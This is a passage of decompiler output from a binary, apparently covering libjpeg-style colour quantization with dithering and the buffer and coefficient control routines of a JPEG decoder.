      local_20 = (uint)*local_40;
      piVar3 = *(int **)(local_8 + 0x88);
      iVar1 = local_c - (uint)*(byte *)(*piVar3 + local_20);
      iVar5 = local_10 - (uint)*(byte *)(piVar3[1] + local_20);
      iVar4 = iVar5 * 3;
      iVar2 = param_7 - (uint)*(byte *)(piVar3[2] + local_20);
      iVar6 = iVar2 * 2;
      local_28 = iVar1 * iVar1 + iVar4 * iVar4 + iVar6 * iVar6;
      local_38 = iVar5 * 0x48 + 0x90;
      local_3c = iVar2 * 0x40 + 0x100;
      piVar3 = local_240;
      local_24 = param_4;
      local_30 = iVar1 * 0x10 + 0x40;
      local_14 = 3;
      do {
        local_2c = local_28;
        local_34 = local_38;
        local_18 = 7;
        do {
          iVar1 = 3;
          iVar4 = local_3c;
          iVar6 = local_2c;
          do {
            if (iVar6 < *piVar3) {
              *piVar3 = iVar6;
              *local_24 = (undefined)local_20;
            }
            iVar6 = iVar6 + iVar4;
            iVar4 = iVar4 + 0x200;
            piVar3 = piVar3 + 1;
            local_24 = local_24 + 1;
            iVar1 = iVar1 + -1;
          } while (-1 < iVar1);
          local_2c = local_2c + local_34;
          local_34 = local_34 + 0x120;
          local_18 = local_18 + -1;
        } while (-1 < local_18);
        local_28 = local_28 + local_30;
        local_30 = local_30 + 0x80;
        local_14 = local_14 + -1;
      } while (-1 < local_14);
      local_1c = local_1c + 1;
      local_40 = local_40 + 1;
    } while (local_1c < param_6);
  }
  return;
}



void FUN_00428328(int param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  short *psVar2;
  byte *pbVar3;
  int iVar4;
  int iVar5;
  byte local_198 [128];
  byte local_118 [256];
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  local_10 = *(int *)(*(int *)(param_1 + 0x1cc) + 0x18);
  local_8 = param_2 >> 2;
  local_c = param_3 >> 3;
  iVar5 = local_c * 0x20 + 2;
  iVar4 = local_8 * 0x20 + 4;
  local_14 = (param_4 >> 2) * 0x20 + 4;
  iVar1 = FUN_00427f70(param_1,iVar4,iVar5,local_118,local_14);
  FUN_004281b0(param_1,iVar4,iVar5,local_198,local_118,iVar1,local_14);
  local_8 = local_8 * 4;
  local_c = local_c * 8;
  pbVar3 = local_198;
  local_18 = 0;
  do {
    iVar1 = 0;
    do {
      psVar2 = (short *)(*(int *)(local_10 + (local_8 + local_18) * 4) + (local_c + iVar1) * 0x40 +
                        (param_4 >> 2) * 8);
      iVar4 = 0;
      do {
        *psVar2 = *pbVar3 + 1;
        pbVar3 = pbVar3 + 1;
        psVar2 = psVar2 + 1;
        iVar4 = iVar4 + 1;
      } while (iVar4 < 4);
      iVar1 = iVar1 + 1;
    } while (iVar1 < 8);
    local_18 = local_18 + 1;
  } while (local_18 < 4);
  return;
}



void FUN_00428408(int param_1,byte **param_2,char **param_3,int param_4)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  byte *pbVar6;
  byte *pbVar7;
  byte *pbVar8;
  short *psVar9;
  char **local_28;
  byte **local_24;
  int local_18;
  
  iVar2 = *(int *)(*(int *)(param_1 + 0x1cc) + 0x18);
  iVar3 = *(int *)(param_1 + 0x70);
  local_18 = 0;
  local_28 = param_3;
  local_24 = param_2;
  if (0 < param_4) {
    do {
      pbVar8 = *local_24;
      pcVar4 = *local_28;
      for (iVar5 = iVar3; iVar5 != 0; iVar5 = iVar5 + -1) {
        bVar1 = *pbVar8;
        pbVar6 = pbVar8 + 1;
        pbVar7 = pbVar8 + 2;
        pbVar8 = pbVar8 + 3;
        psVar9 = (short *)(*(int *)(iVar2 + ((int)(uint)bVar1 >> 3) * 4) +
                           ((int)(uint)*pbVar6 >> 2) * 0x40 + ((int)(uint)*pbVar7 >> 3) * 2);
        if (*psVar9 == 0) {
          FUN_00428328(param_1,(int)(uint)bVar1 >> 3,(int)(uint)*pbVar6 >> 2,(int)(uint)*pbVar7 >> 3
                      );
        }
        *pcVar4 = *(char *)psVar9 + -1;
        pcVar4 = pcVar4 + 1;
      }
      local_18 = local_18 + 1;
      local_28 = local_28 + 1;
      local_24 = local_24 + 1;
    } while (local_18 < param_4);
  }
  return;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_004284d4(int param_1,byte **param_2,int *param_3,int param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  ushort *puVar12;
  uint uVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  int iVar19;
  int *local_74;
  byte **local_70;
  int local_4c;
  int local_48;
  int local_44;
  undefined *local_3c;
  byte *local_38;
  short *local_34;
  int local_30;
  int local_2c;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  
  iVar1 = *(int *)(param_1 + 0x1cc);
  iVar2 = *(int *)(iVar1 + 0x18);
  iVar3 = *(int *)(param_1 + 0x70);
  iVar4 = *(int *)(param_1 + 0x144);
  iVar5 = *(int *)(iVar1 + 0x28);
  iVar6 = **(int **)(param_1 + 0x88);
  iVar7 = *(int *)(*(int *)(param_1 + 0x88) + 4);
  iVar8 = *(int *)(*(int *)(param_1 + 0x88) + 8);
  local_4c = 0;
  local_74 = param_3;
  local_70 = param_2;
  if (0 < param_4) {
    do {
      local_38 = *local_70;
      local_3c = (undefined *)*local_74;
      if (*(int *)(iVar1 + 0x24) == 0) {
        local_44 = 1;
        local_48 = 3;
        local_34 = *(short **)(iVar1 + 0x20);
        *(undefined4 *)(iVar1 + 0x24) = 1;
      }
      else {
        local_38 = local_38 + (iVar3 + -1) * 3;
        local_3c = local_3c + iVar3 + -1;
        local_44 = -1;
        local_48 = -3;
        local_34 = (short *)(*(int *)(iVar1 + 0x20) + (iVar3 * 3 + 3) * 2);
        *(undefined4 *)(iVar1 + 0x24) = 0;
      }
      local_24 = 0;
      local_20 = 0;
      local_1c = 0;
      local_30 = 0;
      local_2c = 0;
      local_28 = 0;
      iVar14 = 0;
      iVar16 = 0;
      iVar18 = 0;
      iVar9 = iVar3;
      while( true ) {
        if (iVar9 == 0) break;
        uVar10 = (uint)*(byte *)(iVar4 + *(int *)(iVar5 + (iVar18 + local_34[local_48] + 8 >> 4) * 4
                                                 ) + (uint)*local_38);
        uVar11 = (uint)*(byte *)(iVar4 + *(int *)(iVar5 + (iVar16 + local_34[local_48 + 1] + 8 >> 4)
                                                          * 4) + (uint)local_38[1]);
        uVar13 = (uint)*(byte *)(iVar4 + *(int *)(iVar5 + (iVar14 + local_34[local_48 + 2] + 8 >> 4)
                                                          * 4) + (uint)local_38[2]);
        iVar18 = (int)uVar10 >> 3;
        iVar16 = (int)uVar11 >> 2;
        iVar14 = (int)uVar13 >> 3;
        puVar12 = (ushort *)(*(int *)(iVar2 + iVar18 * 4) + iVar16 * 0x40 + iVar14 * 2);
        if (*puVar12 == 0) {
          FUN_00428328(param_1,iVar18,iVar16,iVar14);
        }
        iVar18 = *puVar12 - 1;
        *local_3c = (char)iVar18;
        iVar19 = uVar10 - *(byte *)(iVar6 + iVar18);
        iVar17 = uVar11 - *(byte *)(iVar7 + iVar18);
        iVar15 = uVar13 - *(byte *)(iVar8 + iVar18);
        *local_34 = (short)local_28 + (short)iVar19 * 3;
        local_28 = local_1c + iVar19 * 5;
        iVar18 = iVar19 * 7;
        local_34[1] = (short)local_2c + (short)iVar17 * 3;
        local_2c = local_20 + iVar17 * 5;
        iVar16 = iVar17 * 7;
        local_34[2] = (short)local_30 + (short)iVar15 * 3;
        local_30 = local_24 + iVar15 * 5;
        iVar14 = iVar15 * 7;
        local_38 = local_38 + local_48;
        local_3c = local_3c + local_44;
        local_34 = local_34 + local_48;
        iVar9 = iVar9 + -1;
        local_24 = iVar15;
        local_20 = iVar17;
        local_1c = iVar19;
      }
      *local_34 = (short)local_28;
      local_34[1] = (short)local_2c;
      local_34[2] = (short)local_30;
      local_4c = local_4c + 1;
      local_74 = local_74 + 1;
      local_70 = local_70 + 1;
    } while (local_4c < param_4);
  }
  return;
}



void FUN_004287d8(int param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int iVar5;
  int *piVar6;
  
  iVar1 = *(int *)(param_1 + 0x1cc);
  iVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x7fc);
  iVar5 = 0;
  piVar4 = (int *)(iVar2 + 0x3fc);
  uVar3 = 0;
  *(int **)(iVar1 + 0x28) = piVar4;
  piVar6 = piVar4;
  do {
    *piVar6 = iVar5;
    piVar4[-uVar3] = -iVar5;
    piVar6 = piVar6 + 1;
    uVar3 = uVar3 + 1;
    iVar5 = iVar5 + 1;
  } while ((int)uVar3 < 0x10);
  piVar6 = piVar4 + uVar3;
  while ((int)uVar3 < 0x30) {
    *piVar6 = iVar5;
    piVar6 = piVar6 + 1;
    piVar4[-uVar3] = -iVar5;
    iVar5 = iVar5 + (uint)((uVar3 + 1 & 1) == 0);
    uVar3 = uVar3 + 1;
  }
  piVar6 = piVar4 + uVar3;
  for (; (int)uVar3 < 0x100; uVar3 = uVar3 + 1) {
    *piVar6 = iVar5;
    piVar6 = piVar6 + 1;
    piVar4[-uVar3] = -iVar5;
  }
  return;
}



void FUN_00428894(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  
  iVar1 = param_1[0x73];
  uVar3 = *(undefined4 *)(iVar1 + 0x18);
  if (param_1[0x16] != 0) {
    param_1[0x16] = 2;
  }
  if (param_2 == 0) {
    if (param_1[0x16] == 2) {
      *(code **)(iVar1 + 4) = FUN_004284d4;
    }
    else {
      *(code **)(iVar1 + 4) = FUN_00428408;
    }
    *(undefined **)(iVar1 + 8) = &DAT_00428890;
    iVar4 = param_1[0x21];
    if (iVar4 < 1) {
      iVar2 = *param_1;
      *(undefined4 *)(iVar2 + 0x14) = 0x38;
      *(undefined4 *)(iVar2 + 0x18) = 1;
      (**(code **)*param_1)();
    }
    if (0x100 < iVar4) {
      iVar4 = *param_1;
      *(undefined4 *)(iVar4 + 0x14) = 0x39;
      *(undefined4 *)(iVar4 + 0x18) = 0x100;
      (**(code **)*param_1)();
    }
    if (param_1[0x16] == 2) {
      if (*(int *)(iVar1 + 0x20) == 0) {
        uVar3 = (**(code **)(param_1[1] + 4))(param_1,1,param_1[0x1c] * 6 + 0xc,uVar3);
        *(undefined4 *)(iVar1 + 0x20) = uVar3;
      }
      FUN_0042dc2c();
      if (*(int *)(iVar1 + 0x28) == 0) {
        FUN_004287d8((int)param_1);
      }
      *(undefined4 *)(iVar1 + 0x24) = 0;
    }
  }
  else {
    *(undefined **)(iVar1 + 4) = &LAB_004277d0;
    *(undefined **)(iVar1 + 8) = &LAB_0042886c;
    *(undefined4 *)(iVar1 + 0x1c) = 1;
  }
  if (*(int *)(iVar1 + 0x1c) != 0) {
    iVar4 = 0;
    do {
      FUN_0042dc2c();
      iVar4 = iVar4 + 1;
    } while (iVar4 < 0x20);
    *(undefined4 *)(iVar1 + 0x1c) = 0;
  }
  return;
}



void FUN_004289b0(int *param_1)

{
  code **ppcVar1;
  code *pcVar2;
  undefined4 uVar3;
  code *pcVar4;
  int iVar5;
  
  ppcVar1 = (code **)(**(code **)param_1[1])(param_1,1,0x2c);
  param_1[0x73] = (int)ppcVar1;
  *ppcVar1 = FUN_00428894;
  ppcVar1[3] = (code *)&LAB_004289a0;
  ppcVar1[8] = (code *)0x0;
  ppcVar1[10] = (code *)0x0;
  if (param_1[0x1e] != 3) {
    *(undefined4 *)(*param_1 + 0x14) = 0x2f;
    (**(code **)*param_1)();
  }
  pcVar2 = (code *)(**(code **)param_1[1])(param_1,1,0x80);
  ppcVar1[6] = pcVar2;
  iVar5 = 0;
  do {
    uVar3 = (**(code **)(param_1[1] + 4))(param_1,1,0x1000);
    *(undefined4 *)(ppcVar1[6] + iVar5 * 4) = uVar3;
    iVar5 = iVar5 + 1;
  } while (iVar5 < 0x20);
  ppcVar1[7] = (code *)0x1;
  if (param_1[0x1b] == 0) {
    ppcVar1[4] = (code *)0x0;
  }
  else {
    pcVar2 = (code *)param_1[0x18];
    if ((int)pcVar2 < 8) {
      iVar5 = *param_1;
      *(undefined4 *)(iVar5 + 0x14) = 0x38;
      *(undefined4 *)(iVar5 + 0x18) = 8;
      (**(code **)*param_1)();
    }
    if (0x100 < (int)pcVar2) {
      iVar5 = *param_1;
      *(undefined4 *)(iVar5 + 0x14) = 0x39;
      *(undefined4 *)(iVar5 + 0x18) = 0x100;
      (**(code **)*param_1)();
    }
    pcVar4 = (code *)(**(code **)(param_1[1] + 8))(param_1,1,pcVar2,3);
    ppcVar1[4] = pcVar4;
    ppcVar1[5] = pcVar2;
  }
  if (param_1[0x16] != 0) {
    param_1[0x16] = 2;
  }
  if (param_1[0x16] == 2) {
    pcVar2 = (code *)(**(code **)(param_1[1] + 4))(param_1,1,param_1[0x1c] * 6 + 0xc);
    ppcVar1[8] = pcVar2;
    FUN_004287d8((int)param_1);
  }
  return;
}



void FUN_00428ad0(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iStack16;
  
  iVar1 = *(int *)(param_1 + 0x1a8);
  iVar2 = *(int *)(param_1 + 0x13c);
  iVar3 = (***(code ***)(param_1 + 4))(param_1,1,*(int *)(param_1 + 0x24) << 3);
  *(int *)(iVar1 + 0x38) = iVar3;
  *(int *)(iVar1 + 0x3c) = iVar3 + *(int *)(param_1 + 0x24) * 4;
  iStack16 = *(int *)(param_1 + 0xd8);
  for (iVar3 = 0; iVar3 < *(int *)(param_1 + 0x24); iVar3 = iVar3 + 1) {
    iVar4 = (*(int *)(iStack16 + 0xc) * *(int *)(iStack16 + 0x24)) / *(int *)(param_1 + 0x13c);
    iVar5 = (***(code ***)(param_1 + 4))(param_1,1,(iVar2 + 4) * iVar4 * 8);
    iVar5 = iVar5 + iVar4 * 4;
    *(int *)(*(int *)(iVar1 + 0x38) + iVar3 * 4) = iVar5;
    *(int *)(*(int *)(iVar1 + 0x3c) + iVar3 * 4) = iVar5 + (iVar2 + 4) * iVar4 * 4;
    iStack16 = iStack16 + 0x54;
  }
  return;
}



void FUN_00428b98(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 uVar6;
  int iVar7;
  int iVar8;
  int local_2c;
  int local_28;
  int *local_20;
  undefined4 *local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  
  iVar1 = *(int *)(param_1 + 0x1a8);
  iVar2 = *(int *)(param_1 + 0x13c);
  local_2c = 0;
  local_28 = *(int *)(param_1 + 0xd8);
  local_20 = (int *)(iVar1 + 8);
  for (; local_2c < *(int *)(param_1 + 0x24); local_2c = local_2c + 1) {
    iVar7 = (*(int *)(local_28 + 0xc) * *(int *)(local_28 + 0x24)) / *(int *)(param_1 + 0x13c);
    puVar3 = *(undefined4 **)(*(int *)(iVar1 + 0x38) + local_2c * 4);
    puVar4 = *(undefined4 **)(*(int *)(iVar1 + 0x3c) + local_2c * 4);
    puVar5 = (undefined4 *)*local_20;
    local_1c = puVar5;
    local_18 = puVar4;
    local_14 = puVar3;
    for (iVar8 = 0; iVar8 < (iVar2 + 2) * iVar7; iVar8 = iVar8 + 1) {
      uVar6 = *local_1c;
      *local_18 = uVar6;
      *local_14 = uVar6;
      local_14 = local_14 + 1;
      local_18 = local_18 + 1;
      local_1c = local_1c + 1;
    }
    for (iVar8 = 0; SBORROW4(iVar8,iVar7 * 2) != iVar8 + iVar7 * -2 < 0; iVar8 = iVar8 + 1) {
      puVar4[(iVar2 + -2) * iVar7 + iVar8] = puVar5[iVar7 * iVar2 + iVar8];
      puVar4[iVar7 * iVar2 + iVar8] = puVar5[(iVar2 + -2) * iVar7 + iVar8];
    }
    iVar8 = 0;
    if (0 < iVar7) {
      do {
        puVar3[iVar8 - iVar7] = *puVar3;
        iVar8 = iVar8 + 1;
      } while (iVar8 < iVar7);
    }
    local_20 = local_20 + 1;
    local_28 = local_28 + 0x54;
  }
  return;
}



void FUN_00428ce0(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  int iVar6;
  int local_20;
  int local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  
  iVar1 = *(int *)(param_1 + 0x1a8);
  iVar2 = *(int *)(param_1 + 0x13c);
  local_20 = 0;
  local_1c = *(int *)(param_1 + 0xd8);
  for (; local_20 < *(int *)(param_1 + 0x24); local_20 = local_20 + 1) {
    iVar5 = (*(int *)(local_1c + 0xc) * *(int *)(local_1c + 0x24)) / *(int *)(param_1 + 0x13c);
    puVar3 = *(undefined4 **)(*(int *)(iVar1 + 0x38) + local_20 * 4);
    puVar4 = *(undefined4 **)(*(int *)(iVar1 + 0x3c) + local_20 * 4);
    iVar6 = 0;
    local_18 = puVar3;
    local_14 = puVar4;
    if (0 < iVar5) {
      do {
        puVar3[iVar6 - iVar5] = puVar3[(iVar2 + 1) * iVar5 + iVar6];
        puVar4[iVar6 - iVar5] = puVar4[(iVar2 + 1) * iVar5 + iVar6];
        puVar3[(iVar2 + 2) * iVar5 + iVar6] = *local_18;
        puVar4[(iVar2 + 2) * iVar5 + iVar6] = *local_14;
        iVar6 = iVar6 + 1;
        local_14 = local_14 + 1;
        local_18 = local_18 + 1;
      } while (iVar6 < iVar5);
    }
    local_1c = local_1c + 0x54;
  }
  return;
}



void FUN_00428ddc(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  int local_18;
  int local_14;
  
  iVar1 = *(int *)(param_1 + 0x1a8);
  local_18 = 0;
  local_14 = *(int *)(param_1 + 0xd8);
  for (; local_18 < *(int *)(param_1 + 0x24); local_18 = local_18 + 1) {
    uVar6 = *(int *)(local_14 + 0xc) * *(int *)(local_14 + 0x24);
    iVar3 = (int)uVar6 / *(int *)(param_1 + 0x13c);
    uVar5 = *(uint *)(local_14 + 0x2c) % uVar6;
    if (uVar5 == 0) {
      uVar5 = uVar6;
    }
    if (local_18 == 0) {
      *(int *)(iVar1 + 0x48) = (int)(uVar5 - 1) / iVar3 + 1;
    }
    iVar2 = *(int *)(*(int *)(iVar1 + 0x38 + *(int *)(iVar1 + 0x40) * 4) + local_18 * 4);
    for (iVar4 = 0; SBORROW4(iVar4,iVar3 * 2) != iVar4 + iVar3 * -2 < 0; iVar4 = iVar4 + 1) {
      *(undefined4 *)(iVar2 + (iVar4 + uVar5) * 4) = *(undefined4 *)(iVar2 + -4 + uVar5 * 4);
    }
    local_14 = local_14 + 0x54;
  }
  return;
}



void FUN_00428f08(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  
  iVar1 = *(int *)(param_1 + 0x1a8);
  if (*(int *)(iVar1 + 0x30) == 0) {
    iVar3 = (**(code **)(*(int *)(param_1 + 0x1ac) + 0xc))(param_1,iVar1 + 8);
    if (iVar3 == 0) {
      return;
    }
    *(undefined4 *)(iVar1 + 0x30) = 1;
  }
  uVar2 = *(uint *)(param_1 + 0x13c);
  (**(code **)(*(int *)(param_1 + 0x1b0) + 4))
            (param_1,iVar1 + 8,iVar1 + 0x34,param_4,param_3,param_2,uVar2);
  if (uVar2 <= *(uint *)(iVar1 + 0x34)) {
    *(undefined4 *)(iVar1 + 0x30) = 0;
    *(undefined4 *)(iVar1 + 0x34) = 0;
  }
  return;
}



void FUN_00428f80(int param_1,undefined4 param_2,uint *param_3,uint param_4)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *(int *)(param_1 + 0x1a8);
  if (*(int *)(iVar1 + 0x30) == 0) {
    iVar2 = (**(code **)(*(int *)(param_1 + 0x1ac) + 0xc))
                      (param_1,*(undefined4 *)(iVar1 + 0x38 + *(int *)(iVar1 + 0x40) * 4));
    if (iVar2 == 0) {
      return;
    }
    *(undefined4 *)(iVar1 + 0x30) = 1;
    *(int *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) + 1;
  }
  iVar2 = *(int *)(iVar1 + 0x44);
  if (iVar2 != 0) {
    if (iVar2 == 1) goto LAB_0042903e;
    if (iVar2 != 2) {
      return;
    }
    (**(code **)(*(int *)(param_1 + 0x1b0) + 4))
              (param_1,*(undefined4 *)(iVar1 + 0x38 + *(int *)(iVar1 + 0x40) * 4),iVar1 + 0x34,
               param_4,param_3,param_2,*(undefined4 *)(iVar1 + 0x48));
    if (*(uint *)(iVar1 + 0x34) < *(uint *)(iVar1 + 0x48)) {
      return;
    }
    *(undefined4 *)(iVar1 + 0x44) = 0;
    if (param_4 <= *param_3) {
      return;
    }
  }
  *(undefined4 *)(iVar1 + 0x34) = 0;
  *(int *)(iVar1 + 0x48) = *(int *)(param_1 + 0x13c) + -1;
  if (*(int *)(iVar1 + 0x4c) == *(int *)(param_1 + 0x140)) {
    FUN_00428ddc(param_1);
  }
  *(undefined4 *)(iVar1 + 0x44) = 1;
LAB_0042903e:
  (**(code **)(*(int *)(param_1 + 0x1b0) + 4))
            (param_1,*(undefined4 *)(iVar1 + 0x38 + *(int *)(iVar1 + 0x40) * 4),iVar1 + 0x34,param_4
             ,param_3,param_2,*(undefined4 *)(iVar1 + 0x48));
  if (*(uint *)(iVar1 + 0x48) <= *(uint *)(iVar1 + 0x34)) {
    if (*(int *)(iVar1 + 0x4c) == 1) {
      FUN_00428ce0(param_1);
    }
    *(uint *)(iVar1 + 0x40) = *(uint *)(iVar1 + 0x40) ^ 1;
    *(undefined4 *)(iVar1 + 0x30) = 0;
    *(int *)(iVar1 + 0x34) = *(int *)(param_1 + 0x13c) + 1;
    *(int *)(iVar1 + 0x48) = *(int *)(param_1 + 0x13c) + 2;
    *(undefined4 *)(iVar1 + 0x44) = 2;
  }
  return;
}



void FUN_004290a8(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  (**(code **)(*(int *)(param_1 + 0x1b0) + 4))(param_1,0,0,param_4,param_3,param_2,0);
  return;
}



void FUN_004290c8(int *param_1,int param_2)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iStack28;
  int iStack20;
  
  puVar1 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x50);
  param_1[0x6a] = (int)puVar1;
  *puVar1 = &LAB_00428ea0;
  if (param_2 != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 4;
    (**(code **)*param_1)();
  }
  if (*(int *)(param_1[0x71] + 8) == 0) {
    iStack20 = param_1[0x4f];
  }
  else {
    if (param_1[0x4f] < 2) {
      *(undefined4 *)(*param_1 + 0x14) = 0x2f;
      (**(code **)*param_1)();
    }
    FUN_00428ad0((int)param_1);
    iStack20 = param_1[0x4f] + 2;
  }
  iStack28 = 0;
  iVar3 = param_1[0x36];
  puVar1 = puVar1 + 2;
  for (; iStack28 < param_1[9]; iStack28 = iStack28 + 1) {
    uVar2 = (**(code **)(param_1[1] + 8))
                      (param_1,1,*(int *)(iVar3 + 0x1c) * *(int *)(iVar3 + 0x24),
                       ((*(int *)(iVar3 + 0xc) * *(int *)(iVar3 + 0x24)) / param_1[0x4f]) * iStack20
                      );
    *puVar1 = uVar2;
    puVar1 = puVar1 + 1;
    iVar3 = iVar3 + 0x54;
  }
  return;
}



void FUN_004291a8(int param_1)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = *(int *)(param_1 + 0x1ac);
  if (*(int *)(param_1 + 0x148) < 2) {
    uVar2 = *(int *)(param_1 + 0x140) - 1;
    if (uVar2 < *(uint *)(param_1 + 0x94) || uVar2 == *(uint *)(param_1 + 0x94)) {
      *(undefined4 *)(iVar1 + 0x1c) = *(undefined4 *)(*(int *)(param_1 + 0x14c) + 0x48);
    }
    else {
      *(undefined4 *)(iVar1 + 0x1c) = *(undefined4 *)(*(int *)(param_1 + 0x14c) + 0xc);
    }
  }
  else {
    *(undefined4 *)(iVar1 + 0x1c) = 1;
  }
  *(undefined4 *)(iVar1 + 0x14) = 0;
  *(undefined4 *)(iVar1 + 0x18) = 0;
  return;
}



void FUN_00429204(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *(int *)(param_1 + 0x1ac);
  if (*(int *)(iVar1 + 0x10) != 0) {
    if (*(int *)(param_1 + 0x50) != 0) {
      iVar2 = FUN_00429844(param_1);
      if (iVar2 != 0) {
        *(undefined **)(iVar1 + 0xc) = &LAB_00429954;
        goto LAB_00429235;
      }
    }
    *(code **)(iVar1 + 0xc) = FUN_00429674;
  }
LAB_00429235:
  *(undefined4 *)(param_1 + 0x9c) = 0;
  return;
}



undefined4 FUN_00429240(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  code *pcVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  undefined4 uVar9;
  int iVar10;
  int iVar11;
  int iStack48;
  int iStack44;
  int iStack40;
  int local_24;
  int iStack28;
  int *piStack16;
  
  iVar1 = *(int *)(param_1 + 0x1ac);
  uVar6 = *(int *)(param_1 + 0x15c) - 1;
  iVar2 = *(int *)(param_1 + 0x140);
  local_24 = *(int *)(iVar1 + 0x18);
  do {
    if (*(int *)(iVar1 + 0x1c) <= local_24) {
      *(int *)(param_1 + 0x9c) = *(int *)(param_1 + 0x9c) + 1;
      *(int *)(param_1 + 0x94) = *(int *)(param_1 + 0x94) + 1;
      if (*(uint *)(param_1 + 0x94) < *(uint *)(param_1 + 0x140)) {
        FUN_004291a8(param_1);
        uVar9 = 3;
      }
      else {
        (**(code **)(*(int *)(param_1 + 0x1b4) + 0xc))();
        uVar9 = 4;
      }
      return uVar9;
    }
    for (uVar3 = *(uint *)(iVar1 + 0x14); uVar3 <= uVar6; uVar3 = uVar3 + 1) {
      FUN_0042dc2c();
      iVar7 = (**(code **)(*(int *)(param_1 + 0x1bc) + 4))(param_1,iVar1 + 0x20);
      if (iVar7 == 0) {
        *(int *)(iVar1 + 0x18) = local_24;
        *(uint *)(iVar1 + 0x14) = uVar3;
        return 0;
      }
      iStack48 = 0;
      piStack16 = (int *)(param_1 + 0x14c);
      for (iStack44 = 0; iStack44 < *(int *)(param_1 + 0x148); iStack44 = iStack44 + 1) {
        iVar7 = *piStack16;
        if (*(int *)(iVar7 + 0x30) == 0) {
          iStack48 = iStack48 + *(int *)(iVar7 + 0x3c);
        }
        else {
          pcVar4 = *(code **)(*(int *)(param_1 + 0x1c0) + 4 + *(int *)(iVar7 + 4) * 4);
          if (uVar3 < uVar6) {
            iVar8 = *(int *)(iVar7 + 0x34);
          }
          else {
            iVar8 = *(int *)(iVar7 + 0x44);
          }
          iStack28 = *(int *)(param_2 + *(int *)(iVar7 + 4) * 4) +
                     local_24 * *(int *)(iVar7 + 0x24) * 4;
          iVar5 = *(int *)(iVar7 + 0x40);
          for (iStack40 = 0; iStack40 < *(int *)(iVar7 + 0x38); iStack40 = iStack40 + 1) {
            if (((*(uint *)(param_1 + 0x94) < iVar2 - 1U) ||
                (local_24 + iStack40 < *(int *)(iVar7 + 0x48))) &&
               (iVar10 = 0, iVar11 = uVar3 * iVar5, 0 < iVar8)) {
              do {
                (*pcVar4)(param_1,iVar7,*(undefined4 *)(iVar1 + 0x20 + (iStack48 + iVar10) * 4),
                          iVar11,iStack28);
                iVar11 = iVar11 + *(int *)(iVar7 + 0x24);
                iVar10 = iVar10 + 1;
              } while (iVar10 < iVar8);
            }
            iStack48 = iStack48 + *(int *)(iVar7 + 0x34);
            iStack28 = iStack28 + *(int *)(iVar7 + 0x24) * 4;
          }
        }
        piStack16 = piStack16 + 1;
      }
    }
    *(undefined4 *)(iVar1 + 0x14) = 0;
    local_24 = local_24 + 1;
  } while( true );
}



undefined4 FUN_00429484(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  undefined4 uVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int *piVar9;
  int iVar10;
  uint local_3c;
  int local_38;
  int local_34;
  int *local_28;
  int *local_20;
  int local_1c [4];
  
  piVar9 = local_1c;
  iVar1 = *(int *)(param_1 + 0x1ac);
  piVar4 = (int *)(param_1 + 0x14c);
  for (local_38 = 0; local_38 < *(int *)(param_1 + 0x148); local_38 = local_38 + 1) {
    iVar8 = *(int *)(*piVar4 + 0xc);
    iVar8 = (**(code **)(*(int *)(param_1 + 4) + 0x20))
                      (param_1,*(undefined4 *)(iVar1 + 0x48 + *(int *)(*piVar4 + 4) * 4),
                       *(int *)(param_1 + 0x94) * iVar8,1,iVar8);
    *piVar9 = iVar8;
    piVar9 = piVar9 + 1;
    piVar4 = piVar4 + 1;
  }
  local_34 = *(int *)(iVar1 + 0x18);
  do {
    if (*(int *)(iVar1 + 0x1c) <= local_34) {
      *(int *)(param_1 + 0x94) = *(int *)(param_1 + 0x94) + 1;
      if (*(uint *)(param_1 + 0x94) < *(uint *)(param_1 + 0x140)) {
        FUN_004291a8(param_1);
        uVar5 = 3;
      }
      else {
        (**(code **)(*(int *)(param_1 + 0x1b4) + 0xc))();
        uVar5 = 4;
      }
      return uVar5;
    }
    for (local_3c = *(uint *)(iVar1 + 0x14); local_3c < *(uint *)(param_1 + 0x15c);
        local_3c = local_3c + 1) {
      iVar8 = 0;
      local_20 = local_1c;
      local_28 = (int *)(param_1 + 0x14c);
      for (local_38 = 0; local_38 < *(int *)(param_1 + 0x148); local_38 = local_38 + 1) {
        iVar2 = *local_28;
        iVar3 = *(int *)(iVar2 + 0x34);
        for (iVar10 = 0; iVar10 < *(int *)(iVar2 + 0x38); iVar10 = iVar10 + 1) {
          iVar7 = *(int *)(*local_20 + (local_34 + iVar10) * 4) + iVar3 * local_3c * 0x80;
